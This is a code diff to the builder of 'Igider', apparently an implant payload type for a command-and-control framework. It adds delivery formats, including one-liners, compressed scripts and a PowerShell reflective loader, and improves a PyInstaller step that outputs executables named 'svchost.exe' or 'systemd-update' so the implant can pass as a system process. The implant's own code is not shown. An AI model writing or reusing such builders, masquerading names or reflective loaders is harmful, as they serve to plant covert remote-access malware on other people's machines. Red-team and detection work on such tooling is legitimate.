@@ -247,6 +247,13 @@ class Igider(PayloadType):
         import tempfile
         import subprocess
         import shutil
+        import sys
+        
+        # Check if PyInstaller is available
+        try:
+            subprocess.run(["pyinstaller", "--version"], capture_output=True, check=True)
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            raise Exception("PyInstaller is not installed or not available in PATH")
         
         with tempfile.TemporaryDirectory() as temp_dir:
             # Create main Python file
@@ -260,41 +267,64 @@ class Igider(PayloadType):
             with open(spec_file, "w") as f:
                 f.write(spec_content)
             
-            # Add icon for Windows
-            if target_os == "windows":
-                icon_path = os.path.join(temp_dir, "icon.ico")
-                # Create a basic icon or copy from resources
-                # For now, skip icon to avoid complexity
-            
             try:
-                # Run PyInstaller
-                cmd = ["pyinstaller", spec_file]
-               
+                # Run PyInstaller with proper arguments
+                cmd = [
+                    "pyinstaller", 
+                    "--onefile",  # Create single executable
+                    "--clean",    # Clean build
+                    "--noconfirm", # Don't ask for confirmation
+                    spec_file
+                ]
                 
-                result = subprocess.run(cmd, capture_output=True, text=True, cwd=temp_dir)
+                self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
+                result = subprocess.run(
+                    cmd, 
+                    capture_output=True, 
+                    text=True, 
+                    cwd=temp_dir,
+                    timeout=300  # 5 minute timeout
+                )
                 
                 if result.returncode != 0:
-                    raise Exception(f"PyInstaller failed: {result.stderr}")
+                    self.logger.error(f"PyInstaller stdout: {result.stdout}")
+                    self.logger.error(f"PyInstaller stderr: {result.stderr}")
+                    raise Exception(f"PyInstaller failed with return code {result.returncode}: {result.stderr}")
                 
-                # Find and read the generated executable
+                # Find the generated executable in the correct location
                 exe_name = "svchost.exe" if target_os == "windows" else "systemd-update"
-                exe_path = os.path.join(temp_dir, exe_name)
+                
+                # PyInstaller puts executables in dist/ directory
+                dist_dir = os.path.join(temp_dir, "dist")
+                exe_path = os.path.join(dist_dir, exe_name)
                 
                 if not os.path.exists(exe_path):
-                    # Fallback to default PyInstaller output
-                    dist_dir = os.path.join(temp_dir, "dist")
+                    # Fallback: look for any executable in dist directory
                     if os.path.exists(dist_dir):
-                        files = os.listdir(dist_dir)
+                        files = [f for f in os.listdir(dist_dir) if os.path.isfile(os.path.join(dist_dir, f))]
                         if files:
                             exe_path = os.path.join(dist_dir, files[0])
+                            self.logger.info(f"Using fallback executable: {exe_path}")
+                        else:
+                            raise Exception(f"No executable found in {dist_dir}")
+                    else:
+                        raise Exception(f"Distribution directory not created: {dist_dir}")
                 
+                if not os.path.exists(exe_path):
+                    raise Exception(f"Executable not found at expected path: {exe_path}")
+                
+                # Read and return the executable
                 with open(exe_path, "rb") as f:
-                    return f.read()
+                    executable_data = f.read()
                     
+                self.logger.info(f"Successfully built executable of size: {len(executable_data)} bytes")
+                return executable_data
+                    
+            except subprocess.TimeoutExpired:
+                raise Exception("PyInstaller build timed out after 5 minutes")
             except Exception as e:
                 self.logger.error(f"Executable build failed: {e}")
                 raise Exception(f"Failed to build executable: {str(e)}")
-
     async def build(self) -> BuildResponse:
         """Build the Igider payload with the specified configuration."""
         resp = BuildResponse(status=BuildStatus.Success)
@@ -385,27 +415,51 @@ class Igider(PayloadType):
             await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
             
             output_format = self.get_parameter("output")
-            if output_format == "py":
-                # Just return the Python code
-                resp.payload = base_code.encode()
-            elif output_format in ["exe_windows", "elf_linux"]:
-                # Combine all components into a single code string
-                final_code = base_code + "\n" + crypto_code + "\n" + command_code
-                target_os = "windows" if output_format == "exe_windows" else "linux"
-                exe_bytes = await self._build_executable(final_code, target_os)
-                resp.payload = exe_bytes
-            elif output_format == "base64":
-                final_code = base_code + "\n" + crypto_code + "\n" + command_code
-                resp.payload = base64.b64encode(final_code.encode())
+            if output_format == "base64":
+                resp.payload = base64.b64encode(base_code.encode())
+                resp.build_message = "Successfully built payload in base64 format"
+            elif output_format == "py_compressed":
+                compressed_code = compress_code(base_code)
+                resp.payload = compressed_code.encode()
+                resp.build_message = "Successfully built compressed Python payload"
+            elif output_format == "one_liner":
+                one_liner = create_one_liner(base_code)
+                resp.payload = one_liner.encode()
+                resp.build_message = "Successfully built one-liner payload"
+            elif output_format == "exe_windows":
+                try:
+                    await self.update_build_step("Finalizing Payload", "Building Windows executable...")
+                    executable_data = await self._build_executable(base_code, "windows")
+                    resp.payload = executable_data
+                    resp.build_message = "Successfully built Windows executable"
+                except Exception as e:
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Failed to build Windows executable: {str(e)}"
+                    return resp
+            elif output_format == "elf_linux":
+                try:
+                    await self.update_build_step("Finalizing Payload", "Building Linux executable...")
+                    executable_data = await self._build_executable(base_code, "linux")
+                    resp.payload = executable_data
+                    resp.build_message = "Successfully built Linux executable"
+                except Exception as e:
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Failed to build Linux executable: {str(e)}"
+                    return resp
             elif output_format == "powershell_reflective":
-                final_code = base_code + "\n" + crypto_code + "\n" + command_code
-                ps_code = self._create_powershell_loader(final_code)
-                resp.payload = ps_code.encode()
-            # Add similar handling for 'py_compressed', 'one_liner', etc.
-            else:
-                resp.set_status(BuildStatus.Error)
-                resp.build_stderr = f"Unsupported output format: {output_format}"
-
+                try:
+                    await self.update_build_step("Finalizing Payload", "Creating PowerShell reflective loader...")
+                    ps_loader = self._create_powershell_loader(base_code)
+                    resp.payload = ps_loader.encode()
+                    resp.build_message = "Successfully built PowerShell reflective loader"
+                except Exception as e:
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Failed to build PowerShell loader: {str(e)}"
+                    return resp
+            else:  # default to py
+                resp.payload = base_code.encode()
+                resp.build_message = "Successfully built Python script payload"
+            
             # Report any non-fatal errors
             if build_errors:
                 resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
